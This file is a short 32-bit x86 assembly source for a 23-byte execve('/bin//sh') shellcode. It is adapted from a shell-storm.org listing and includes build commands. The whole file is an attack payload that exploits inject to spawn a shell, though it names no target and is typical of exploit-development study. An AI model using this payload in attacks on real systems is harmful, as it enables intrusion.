//https://shell-storm.org/shellcode/files/shellcode-827.html 
// modified to push 0 into EDX for envp (arg2) in syscall to execve
// execve('/bin//sh') in 23 bytes

//as --32 execveShellstormEDX.S -o execveShellstormEDX.o
//ld -m elf_i386 execveShellstormEDX.o -o execveShellstormEDX

.section .data

.section .text
.globl _start
_start:

xor %eax,%eax
push %eax
push %eax
pop %edx
push $0x68732f2f 
push $0x6e69622f 
mov %esp,%ebx 
push %eax 
push %ebx 
mov %esp,%ecx 
mov $0xb,%al 
int $0x80



